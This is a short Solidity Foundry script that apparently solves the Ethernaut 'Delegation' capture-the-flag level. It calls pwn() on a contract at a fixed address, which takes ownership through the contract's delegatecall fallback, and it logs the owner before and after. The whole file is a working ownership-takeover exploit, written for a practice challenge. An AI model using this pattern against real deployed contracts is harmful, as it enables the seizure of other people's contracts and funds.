//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegate.sol";

contract DelegateSolution is Script {
  Delegation delegatetionInstance = Delegation(0xC4849f462F7C7f4F4dE8CDC37F53E767253aE251);

  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    console.log("Owner: ", delegatetionInstance.owner());
   (bool result,) =  address(delegatetionInstance).call(abi.encodeWithSignature("pwn()"));
   if (result) {
            this;
        }
    console.log("Owner: ", delegatetionInstance.owner());
    console.log("My address: ", vm.envAddress("MY_ADDRESS"));
    vm.stopBroadcast();
  }
}